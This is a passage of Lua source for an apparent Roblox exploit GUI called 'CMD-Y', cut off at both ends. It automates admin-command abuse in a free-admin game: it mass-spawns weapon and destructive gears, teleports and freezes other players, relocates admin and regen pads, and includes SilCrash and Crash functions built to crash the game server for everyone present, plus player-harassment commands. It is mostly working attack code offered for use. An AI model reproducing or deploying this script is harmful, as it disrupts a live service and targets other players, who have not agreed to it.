				workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = workspace[CurrentPlayer].HumanoidRootPart.CFrame
			end
			Tabs.Drop.Visible = false
			Tabs.Drop.PlayerMenu.Visible = false
			CurrentPlayer = ""
		end)

		Tabs.Drop.PlayerMenu.Teleport.MouseButton1Click:Connect(function()
			local isBypass,st = bypassattemptcheck(CurrentPlayer)
			if isBypass == true then
				act("tp " .. st .. " me")
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			else
				act("tp " .. CurrentPlayer .. " me")
				Tabs.Drop.Visible = false
				Tabs.Drop.PlayerMenu.Visible = false
				CurrentPlayer = ""
			end
		end)

		Tabs.Drop.PlayerMenu.close.MouseButton1Click:Connect(function()
			Tabs.Drop.Visible = false
			Tabs.Drop.PlayerMenu.Visible = false
			CurrentPlayer = ""
			Tabs.Drop.PlayerMenu.Unperm.Text = "Unperm"
			Tabs.Drop.PlayerMenu.Whitelist.Text = "Whitelist"
			Tabs.Drop.PlayerMenu.Blacklist.Text = "Blacklist"
			Tabs.Drop.PlayerMenu.Padban.Text = "Padban"
		end)

		--Gears Page
		GearsP.Guns.MouseButton1Click:Connect(function()
			for i,_ in pairs(guncodes) do
				act("gear me 0000000000000000000000000000000000000000" .. guncodes[i])
			end
		end)

		GearsP.FunGears.MouseButton1Click:Connect(function()
			for i,_ in pairs(fungears) do
				act("gear me 0000000000000000000000000000000000000000" .. fungears[i])
			end
		end)

		GearsP.Swords.MouseButton1Click:Connect(function()
			for i,_ in pairs(swordcodes) do
				act("gear me 0000000000000000000000000000000000000000" .. swordcodes[i])
			end
		end)

		GearsP.Destructive.MouseButton1Click:Connect(function()
			for i,_ in pairs(destructivecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. destructivecodes[i])
			end
		end)

		GearsP.Explosives.MouseButton1Click:Connect(function()
			for i,_ in pairs(explosivecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. explosivecodes[i])
			end
		end)

		GearsP.Melees.MouseButton1Click:Connect(function()
			for i,_ in pairs(meleecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. meleecodes[i])
			end
		end)

		GearsP.Rideables.MouseButton1Click:Connect(function()
			for i,_ in pairs(rideablecodes) do
				act("gear me 0000000000000000000000000000000000000000" .. rideablecodes[i])
			end
		end)

		GearsP.ClientBtools.MouseButton1Click:Connect(function()
			act("gear me 16200204")
			act("gear me 16200402")
			act("gear me 16969792")
			act("gear me 73089190")
		end)

		GearsP.SSBtools.MouseButton1Click:Connect(function()
			loadbtools()
		end)


		CMDY.BtoolsV2Button.MouseButton1Click:Connect(function()
			btoolsv2()
		end)

		--Teleports Page
		TeleportsP.House.MouseButton1Click:Connect(function()
			if workspace:FindFirstChild(Player.Name) then
				workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = CFrame.new(-31.0896435, 8.22999477, 70.522644, -0.999961913, 4.495271e-08, -0.0087288795, 4.55292621e-08, 1, -6.58523618e-08, 0.0087288795, -6.62472743e-08, -0.999961913)
			end
		end)

		TeleportsP.RegenPad.MouseButton1Click:Connect(function()
			if workspace:FindFirstChild(Player.Name) then
				if Admin:FindFirstChild("Regen") then
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
				else
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = CFrame.new(-7.25397968, 8.62999058, 94.4259109, -0.999847651, 2.98951726e-08, 0.0174559467, 2.93358955e-08, 1, -3.22955387e-08, -0.0174559467, -3.177853e-08, -0.999847651)
				end
			end
		end)

		TeleportsP.Spawn.MouseButton1Click:Connect(function()
			if workspace:FindFirstChild(Player.Name) then
				if Map:FindFirstChild("Spawn1") then
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = Map.Spawn1.CFrame * CFrame.new(0,1,0)
				else
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = CFrame.new(-41, 3.69999933, -25.5899963, -1, 0, 0, 0, 1, 0, 0, 0, -1)
				end
			end
		end)

		TeleportsP.AdminPads.MouseButton1Click:Connect(function()
			if workspace:FindFirstChild(Player.Name) then
				if PermPad ~= nil and PermPad:FindFirstChildOfClass("Part") then
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = PermPad:FindFirstChildOfClass("Part").CFrame * CFrame.new(0,1,0)
				else
					workspace:FindFirstChild(Player.Name).HumanoidRootPart.CFrame = CFrame.new(-28.8631248, 8.54999638, 93.495575, -0.999919176, 2.82151351e-08, -0.0127136419, 2.86314137e-08, 1, -3.25606209e-08, 0.0127136419, -3.29219958e-08, -0.999919176)
				end
			end
		end)

		--objects page

		ObjectsP.FindPads.MouseButton1Click:Connect(function()
			local loop1 = false
			local loop2 = false
			local dnd = false
			local amt = 0
			for _,v in pairs(Pads) do
				if v:FindFirstChildOfClass("Part") then
					amt = amt + 1
				end
			end
			if amt == 9 then
				prompt("All pads are loaded!")
				loop1 = false
				loop2 = false
				return
			else
				amt = 0
				local loop2 = true
				prompt("Trying skydive locations..")
				clientloadpos(CFrame.new(ogcframes["Pad1"][1],ogcframes["Pad1"][2],ogcframes["Pad1"][3],ogcframes["Pad1"][4],ogcframes["Pad1"][5],ogcframes["Pad1"][6],ogcframes["Pad1"][7],ogcframes["Pad1"][8],ogcframes["Pad1"][9],ogcframes["Pad1"][10],ogcframes["Pad1"][11],ogcframes["Pad1"][12]) * CFrame.new(0,40,0))
				wait(2)
				task.spawn(function()
					while loop2 == true do
						task.wait(.3)
						PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity + Vector3.new(0, 1000, 0)
						for _,v in pairs(Pads) do
							if v:FindFirstChildOfClass("Part") then
								amt = amt + 1
							end
						end
						if amt == 9 then
							prompt("Found all pads")
							loop2 = false
							loop1 = false
							PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
							dnd = true
							forcerespawn()
							break
						end
						amt = 0
						if loop2 == false then break end
					end
				end)
				if dnd == true then return end
				wait(10)
				loop2 = false
				amt = 0
				for _,v in pairs(Pads) do
					if v:FindFirstChildOfClass("Part") then
						amt = amt + 1
					end
				end
				if amt == 9 then
					loop2 = false
					loop1 = false
					dnd = true
					return
				else
					prompt("Couldn't find all pads.")
					if dnd == true then return end

					workspace.Gravity = 0
					loop1 = true
					task.spawn(function()
						prompt("Trying CMD-Y locations..")
						while loop1 do
							task.wait()
							clientloadpos(CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455)))
							amt = 0
							for _,v in pairs(Pads) do
								if v:FindFirstChildOfClass("Part") then
									amt = amt + 1
								end
							end
							if amt == 9 then
								prompt("Found all pads")
								loop2 = false
								loop1 = false
								dnd = true
								forcerespawn()
								return
							end
						end
					end)
					if dnd == true then return end
					wait(10)
					amt = 0
					loop1 = false
					for _,v in pairs(Pads) do
						if v:FindFirstChildOfClass("Part") then
							amt = amt + 1
						end
					end
					if amt == 9 then
						prompt("Found all pads")
						loop2 = false
						loop1 = false
						dnd = true
						forcerespawn()
						return
					else
						prompt("Couldn't find all pads.")
						forcerespawn()
					end
					if dnd == true then return end
					fixgame()
				end
			end

		end)

		ObjectsP.RemoveRegen.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Admin.Regen, 1)
			repeat task.wait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		ObjectsP.BringRegen.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Admin.Regen, 2)
			repeat task.wait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		ObjectsP.RemoveObby.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			if Map:FindFirstChild("Obby") then
				for _,v in pairs(Map["Obby"]:GetDescendants()) do
					if allclear() == false then break end
					if v.Name == "TouchInterest" then
						v:Destroy()
					end
				end
			end
			for _,v in pairs(Map["Obby Box"]:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 1)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(Map.Obby:GetChildren()) do
				if allclear() == false then break end
				moveobject(v, 1)
				repeat fwait() until movestatus == false
				act("respawn me")
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		ObjectsP.BringObby.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			local moved = nil
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			if Map:FindFirstChild("Obby") then
				for _,v in pairs(Map["Obby"]:GetDescendants()) do
					if allclear() == false then break end
					if v.Name == "TouchInterest" then
						v:Destroy()
					end
				end
			end
			for _,v in pairs(Map["Obby Box"]:GetChildren()) do
				if allclear() == false then break end
				if v ~= nil and v.CFrame == CFrame.new(ogcframes[v.Name][1],ogcframes[v.Name][2],ogcframes[v.Name][3],ogcframes[v.Name][4],ogcframes[v.Name][5],ogcframes[v.Name][6],ogcframes[v.Name][7],ogcframes[v.Name][8],ogcframes[v.Name][9],ogcframes[v.Name][10],ogcframes[v.Name][11],ogcframes[v.Name][12]) then
					continue
				else
					if v ~= nil then
						moved = true
						moveobject(v, 2)
						repeat fwait() until movestatus == false
						act("respawn me")
					end
				end
			end
			for _,v in pairs(Map.Obby:GetChildren()) do
				if allclear() == false then break end
				if v ~= nil and v.CFrame == CFrame.new(ogcframes[v.Name][1],ogcframes[v.Name][2],ogcframes[v.Name][3],ogcframes[v.Name][4],ogcframes[v.Name][5],ogcframes[v.Name][6],ogcframes[v.Name][7],ogcframes[v.Name][8],ogcframes[v.Name][9],ogcframes[v.Name][10],ogcframes[v.Name][11],ogcframes[v.Name][12]) then
					continue
				else
					if v ~= nil then
						moved = true
						moveobject(v, 2)
						repeat fwait() until movestatus == false
						act("respawn me")
					end
				end
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
			if moved == nil then
				prompt("Obby is already in the right place!")
			end
		end)

		ObjectsP.RemovePads.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			for _,v in pairs(Pads) do
				if allclear() == false then break end
				if v:FindFirstChildOfClass("Part") then
					v:FindFirstChildOfClass("Part").CanCollide = true
					moveobject(v:FindFirstChildOfClass("Part"), 1)
					repeat fwait() until movestatus == false
					act("respawn me")
					v:FindFirstChildOfClass("Part").CanCollide = false
				end
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		ObjectsP.BringPads.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			for i,v in pairs(Pads) do
				if allclear() == false then break end
				if v:FindFirstChildOfClass("Part") then
					v:FindFirstChildOfClass("Part").Name = "Pad" .. tostring(i)
				end
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			for i,v in pairs(Pads) do
				if allclear() == false then break end
				if v:FindFirstChildOfClass("Part") then
					v:FindFirstChildOfClass("Part").CanCollide = true
					moveobject(v:FindFirstChildOfClass("Part"), 2)
					repeat fwait() until movestatus == false
					act("respawn me")
					v:FindFirstChildOfClass("Part").CanCollide = false
				end
			end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
			workspace.Gravity = 198.2
			act("respawn me")
		end)

		ObjectsP.BringBaseplate.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Map.Baseplate, 2)
			repeat fwait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		ObjectsP.RemoveBaseplate.MouseButton1Click:Connect(function()
			if movestatus == true then return end
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = false
				end
			end
			moveobject(Map.Baseplate, 1)
			repeat fwait() until movestatus == false
			workspace.Gravity = 198.2
			act("respawn me")
			for _,v in pairs(game.Workspace:GetDescendants()) do
				if v:IsA("Part") then
					v.CanCollide = true
				end
			end
		end)

		ObjectsP.FindRegen.MouseButton1Click:Connect(function()
			local regenfound = false
			local findingregen = false
			local doingskydive = false
			local doingcmdy = false
			if Admin:FindFirstChild("Regen") then
				PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin:FindFirstChild("Regen").CFrame * CFrame.new(0,1,0)
			else
				findingregen = true
				task.spawn(function()
					while findingregen do
						task.wait()
						pcall(function()
							game.Players.LocalPlayer.Character.Parent = workspace
						end)
					end
				end)
				doingskydive = true
				prompt("Trying skydive locations..")
				pcall(function()
					clientloadpos(CFrame.new(ogcframes["Regen"][1],ogcframes["Regen"][2],ogcframes["Regen"][3],ogcframes["Regen"][4],ogcframes["Regen"][5],ogcframes["Regen"][6],ogcframes["Regen"][7],ogcframes["Regen"][8],ogcframes["Regen"][9],ogcframes["Regen"][10],ogcframes["Regen"][11],ogcframes["Regen"][12]) * CFrame.new(0,20,0))
					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
					task.spawn(function()
						while doingskydive do
							task.wait()
							game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,100,0)
							if Admin:FindFirstChild("Regen") then
								regenfound = true
								doingskydive = false
								break
							end
						end
					end)
					task.wait(10)
					if not regenfound then
						doingskydive = false
						prompt("Regen not skydived.")
						prompt("Trying CMD-Y locations..")
						doingcmdy = true
						task.spawn(function()
							while doingcmdy do
								fwait()
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455))
								if Admin:FindFirstChild("Regen") then
									PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
									regenfound = true
									doingcmdy = false
									break
								end
							end
						end)
						task.wait(15)
						if not foundregen then
							doingcmdy = false
							prompt("Regen not moved by CMD-Y.")
							prompt("Trying leaked locations..")
							clientloadpos(CFrame.new(Vector3.new(1000000, 1000000, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -1000000, -3)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(3, -1000000, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -3, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, -3, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, 3, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, 1000003, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(1000000, -1000003, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(454545, 150000, -678678)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(306712, 420552, 398158)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, 1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, 1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-1000000, -1000003, -1000000)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(45400, -49860, 56673)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(56470, -48312, 28578)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(75304, -49638, 47300)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(34120, -48830, 30233)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(77822, -49751, 79116)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(42682, -29202, 29886)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(51052, -49558, 34068)))
							task.wait(.5)
							clientloadpos(CFrame.new(Vector3.new(-251773, 1000003, 382563)))
							task.wait(.5)
							clientloadpos(CFrame.new(0, 2.5, 0))
							task.wait(.5)
							if not Admin:FindFirstChild("Regen") then
								prompt("Couldn't find the regen pad. Sorry!")
								forcerespawn()
							else
								prompt("Found regen!")
								PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
								wait(1)
								forcerespawn()

								workspace.Gravity = 198.2
								findingregen = false
							end
						else
							prompt("Found regen!")
							PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
							wait(1)
							forcerespawn()

							workspace.Gravity = 198.2
							findingregen = false
						end
					else
						prompt("Found regen!")
						PlayerService.LocalPlayer.Character.HumanoidRootPart.CFrame = Admin.Regen.CFrame * CFrame.new(0,1,0)
						wait(1)
						forcerespawn()

						workspace.Gravity = 198.2
						findingregen = false
					end
				end)
			end
		end)

		task.spawn(function()
			while true do
				fwait()
				if antiattach then
					for _,v in pairs(PlayerService:GetPlayers()) do
						local isBypass, st = bypassattemptcheck(v.Name)
						if workspace:FindFirstChild(v.Name) and workspace:FindFirstChild(v.Name):FindFirstChild("Addon") then
							if workspace:FindFirstChild(v.Name):FindFirstChild("Addon"):FindFirstChild("Weld") then
								if isBypass then
									act("refresh " .. st)
									regen()
									act("freeze " .. st)
									if showsm then
										act("name " .. st .. " [ CMD-Y ] AntiAttach is on!") 
									end
								else
									act("refresh " .. v.Name)
									regen()
									act("freeze " .. v.Name)
									if showsm then
										act("name " .. v.Name .. " [ CMD-Y ] AntiAttach is on!") 
									end
								end
							end
						end
					end
				end
			end
		end)

		resbut.MouseButton1Click:Connect(function()
			settheme(nil,nil,nil,true)
		end)

		SettingsP.GuiTheme.MouseButton1Click:Connect(function()

			Tabs.Drop.BackgroundTransparency = 1
			Tabs.Drop.ThemeColorPickerMenu.BackgroundTransparency = 1
			Tabs.Drop.Visible = true
			Tabs.Drop.ThemeColorPickerMenu.Visible = true
			TS:Create(Tabs.Drop, TweenInfo.new(.4), {BackgroundTransparency = 0.15}):Play()
			TS:Create(Tabs.Drop.ThemeColorPickerMenu, TweenInfo.new(.4), {BackgroundTransparency = 0}):Play()
			Tabs.Drop.MapColorPicker.close.MouseButton1Click:Connect(function()
				Tabs.Drop.Visible = false
				Tabs.Drop.ThemeColorPickerMenu.Visible = false
			end)


			local ColorSlider = Tabs.Drop.ThemeColorPickerMenu.Gradient.Slider
			local preview = Tabs.Drop.ThemeColorPickerMenu.Preview
			local Grad = Tabs.Drop.ThemeColorPickerMenu.Gradient
			local otherpreview = Tabs.Drop.ThemeColorPickerMenu.Preview
			local movingcolorslider = false

			ColorSlider.MouseButton1Down:Connect(function()
				movingcolorslider = true

			end)

			ColorSlider.MouseButton1Up:Connect(function()
				movingcolorslider = false
				Tabs.Drop.Visible = false
				Tabs.Drop.ThemeColorPickerMenu.Visible = false
			end)

			Mouse.Move:Connect(function()
				if movingcolorslider then
					local xOffset = (Mouse.X - Grad.AbsolutePosition.X)
					xOffset = math.clamp(xOffset, 0, Grad.AbsoluteSize.X)

					local sliderposnew = UDim2.new(0, xOffset, ColorSlider.Position.Y)
					ColorSlider.Position = sliderposnew
					settheme(Tabs.Drop.ThemeColorPickerMenu.Preview.BackgroundColor3.r,Tabs.Drop.ThemeColorPickerMenu.Preview.BackgroundColor3.g,Tabs.Drop.ThemeColorPickerMenu.Preview.BackgroundColor3.b)
					updatecolorpreview(Grad, ColorSlider, preview, otherpreview)
				end
			end)
		end)

		CommandsP.AddCommand.MouseButton1Click:Connect(function()
			Tabs.Drop.BackgroundTransparency = 1
			Tabs.Drop.AddCommandMenu.BackgroundTransparency = 1
			Tabs.Drop.AddCommandMenu.Visible = true
			Tabs.Drop.Visible = true
			TS:Create(Tabs.Drop, TweenInfo.new(.4), {BackgroundTransparency = 0.15}):Play()
			TS:Create(Tabs.Drop.AddCommandMenu, TweenInfo.new(.4), {BackgroundTransparency = 0}):Play()

			Tabs.Drop.AddCommandMenu.closebbb.MouseButton1Click:Connect(function()
				Tabs.Drop.Visible = false
				Tabs.Drop.AddCommandMenu.Visible = false
			end)


			Tabs.Drop.AddCommandMenu.Add.MouseButton1Click:Connect(function()
				if Tabs.Drop.AddCommandMenu.NameToDo.Text ~= nil and Tabs.Drop.AddCommandMenu.NameToDo.Text ~= "" and Tabs.Drop.AddCommandMenu.NameToDo.Text ~= " " and Tabs.Drop.AddCommandMenu.CMDBOX.Text ~= nil and Tabs.Drop.AddCommandMenu.CMDBOX.Text ~= "" and Tabs.Drop.AddCommandMenu.CMDBOX.Text ~= " " then
					local suc,err = pcall(function()
						_G.newcmdadd(Tabs.Drop.AddCommandMenu.NameToDo.Text, Tabs.Drop.AddCommandMenu.CMDBOX.Text)
					--[[addcmd(, nil, "", function()
						assert(loadstring(execute[Tabs.Drop.AddCommandMenu.NameToDo.Text]))()
					end)]]
					end)
					if suc then
						Tabs.Drop.Visible = false
						Tabs.Drop.AddCommandMenu.Visible = false
						Tabs.Drop.AddCommandMenu.NameToDo.Text = ""
						Tabs.Drop.AddCommandMenu.CMDBOX.Text = ""
					else
						prompt("Error adding command. " .. tostring(err))
					end
				end
			end)

		end)


		MiscP.SilentLogs.MouseButton1Click:Connect(function()
			CMDY.SilentLogsBar.Visible = true
		end)


		local cattachbutton = false
		MiscP.ClickToAttach.MouseButton1Click:Connect(function()
			if MiscP.ClickToAttach.Text == "Unattach" then
				MiscP.ClickToAttach.Text = "Unattaching..."
				if allclear() == true then
					act("refresh me")
					MiscP.ClickToAttach.Text = "Click to attach"
				else
					forcerespawn()
					MiscP.ClickToAttach.Text = "Click to attach"
				end
			elseif MiscP.ClickToAttach.Text == "Click to attach" then
				if cattachbutton == false then
					cattachbutton = true
				else
					return
				end

				MiscP.ClickToAttach.Text = "Waiting for input..."
				local target

				Mouse.Button1Down:Connect(function()
					if cattachbutton == false then return end
					target = Mouse.Target
				end)

				Mouse.Button1Up:Connect(function()
					if cattachbutton == false then return end
					cattachbutton = false

					if target ~= nil and workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
						attach(target)
						if MiscP.ClickToAttach.Text == "Waiting for input..." then
							MiscP.ClickToAttach.Text = "Unattach"
						end
					end

					task.spawn(function()
						while true do
							fwait()
							if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("Torso") then
								if not workspace:FindFirstChild(Player.Name):FindFirstChild("Torso"):FindFirstChild("Weld") then
									MiscP.ClickToAttach.Text = "Click to attach"
									break
								end
							else
								MiscP.ClickToAttach.Text = "Click to attach"
								forcerespawn()
								break
							end
						end
					end)
				end)
			end
		end)

		MiscP.SilCrash.MouseButton1Click:Connect(function()
			local dosilcrash = false
			dosilcrash = true
			AntiAbuse = false
			AntiDeath = false
			task.spawn(function()
				prompt("Please wait ingame for atleast 15 seconds to ensure the game crashes.")
				wait(1)
				while true do
					fwait()
					if workspace:FindFirstChild(Player.Name) and workspace:FindFirstChild(Player.Name):FindFirstChild("HumanoidRootPart") then
						for _,v in pairs(Pads) do
							touchpad(v)
						end
					end
					for i = 1, 700 do
						for i = 1, 3 do
							act("size all 0.3")
						end
						act("freeze all")
						for i = 1, 3 do
							act("size all 9.9")
						end
						act("clone all")
						wait(0.75)
						act("unchar all")
						if dosilcrash == false then break end
					end
					if dosilcrash == false then break end
				end
			end)
			task.wait(15)
			dosilcrash = false
			prompt("Game should be crashed.")
		end)

		MiscP.Crash.MouseButton1Click:Connect(function()
			AntiDeath = true
			AntiAbuse = true
			slock()
			act("gear me 94794847")
			AntiDeath = false
			AntiAbuse = false
			LoopGrab = true
			wait(.25)
			wait(.5)
			act("blind all")
			wait()
			act("h \n\n\n Client has initiated disconnect. \n\n\n")
			PlayerService.LocalPlayer.Backpack:WaitForChild("VampireVanquisher").Parent = PlayerService.LocalPlayer.Character
			wait(.25)
			act("size me .3")
			act("size me .3")
			act("size me .3")
			LoopGrab = false
		end)

		MiscP.ColorMap.MouseButton1Click:Connect(function()

			Tabs.Drop.BackgroundTransparency = 1
			Tabs.Drop.MapColorPicker.BackgroundTransparency = 1
			Tabs.Drop.Visible = true
			Tabs.Drop.MapColorPicker.Visible = true
			TS:Create(Tabs.Drop, TweenInfo.new(.4), {BackgroundTransparency = 0.15}):Play()
			TS:Create(Tabs.Drop.MapColorPicker, TweenInfo.new(.4), {BackgroundTransparency = 0}):Play()
			Tabs.Drop.MapColorPicker.close.MouseButton1Click:Connect(function()
				Tabs.Drop.Visible = false
				Tabs.Drop.MapColorPicker.Visible = false
			end)


			local ColorSlider = Tabs.Drop.MapColorPicker.Gradient.Slider
			local preview = Tabs.Drop.MapColorPicker.Preview
			local Grad = Tabs.Drop.MapColorPicker.Gradient
			local otherpreview = MiscP.ColorMap.ColorFrame
			local movingcolorslider = false

			ColorSlider.MouseButton1Down:Connect(function()
				movingcolorslider = true

			end)

			ColorSlider.MouseButton1Up:Connect(function()
				movingcolorslider = false
				Tabs.Drop.Visible = false
				Tabs.Drop.MapColorPicker.Visible = false
				if PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
					PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket"):Destroy()
					act("removetools me")
				end
				if PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket") then
					PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket"):Destroy()
					act("removetools me")
				end
				act("gear me 000000000000000000000000000018474459")
				PlayerService.LocalPlayer.Backpack:WaitForChild("PaintBucket").Parent = PlayerService.LocalPlayer.Character
				local bucket = PlayerService.LocalPlayer.Character:WaitForChild("PaintBucket")
				paintmap(preview.BackgroundColor3.R,preview.BackgroundColor3.G,preview.BackgroundColor3.B)
			end)

			Mouse.Move:Connect(function()
				if movingcolorslider then
					local xOffset = (Mouse.X - Grad.AbsolutePosition.X)
					xOffset = math.clamp(xOffset, 0, Grad.AbsoluteSize.X)

					local sliderposnew = UDim2.new(0, xOffset, ColorSlider.Position.Y)
					ColorSlider.Position = sliderposnew
					updatecolorpreview(Grad, ColorSlider, preview, otherpreview)
				end
			end)
		end)

		MiscP.SilentLogs.MouseButton1Click:Connect(function()

		end)

		MiscP.FixColors.MouseButton1Click:Connect(function()
			if PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket") then
				PlayerService.LocalPlayer.Backpack:FindFirstChild("PaintBucket"):Destroy()
				act("removetools me")
			end
			if PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket") then
				PlayerService.LocalPlayer.Character:FindFirstChild("PaintBucket"):Destroy()
				act("removetools me")
			end
			act("gear me 000000000000000000000000000018474459")
			PlayerService.LocalPlayer.Backpack:WaitForChild("PaintBucket").Parent = PlayerService.LocalPlayer.Character
			local bucket = PlayerService.LocalPlayer.Character:WaitForChild("PaintBucket")
			colorallOriginal()
		end)

		MiscP.ForceRespawn.MouseButton1Click:Connect(function()
			forcerespawn()
		end)

		--COMMANDS

		addcmd("forceres", "res", "force respawns you", function()
			forcerespawn()
		end)

		addcmd("rainbowmap", "rmap", "makes map go rainbow", function()
			rainbowmap = true
			task.spawn(function()
				act("gear me 000000000000000000000000000018474459")
				PlayerService.LocalPlayer.Backpack:WaitForChild("PaintBucket").Parent = PlayerService.LocalPlayer.Character
				local bucket = PlayerService.LocalPlayer.Character:WaitForChild("PaintBucket")
				repeat
					fwait()
					for hue=0, 1, 1/60 do
						paintmap(Color3.fromHSV(hue,1,1).R,Color3.fromHSV(hue,1,1).G,Color3.fromHSV(hue,1,1).B)
					end
				until
				rainbowmap == false
			end)
		end)

		addcmd("unrainbowmap", "unrmap", "stops rainbow map", function()
			rainbowmap = false
		end)

		addcmd("rail", nil, "rails a person",function(plr)
			for _,v in pairs(PlayerService:GetChildren()) do
				local isBypass, st = bypassattemptcheck(v.Name)
				local name,plrname = string.lower(v.Name), string.lower(plr)
				if string.sub(name, 1, string.len(plrname)) == plrname then
					if workspace:FindFirstChild(v.Name) then
						if isBypass == true then
							act("ff " .. st)
							act("god " .. st)
							act("spin " .. st)
							for i = 1,300 do
								act("gear me 0000000000000000000000000000000079446473")
							end
							wait(2)
							if Player:FindFirstChild("Backpack") then
								for _,t in pairs(Player.Backpack:GetChildren()) do
									t.Parent = PlayerService.LocalPlayer.Character
									task.wait(.02)
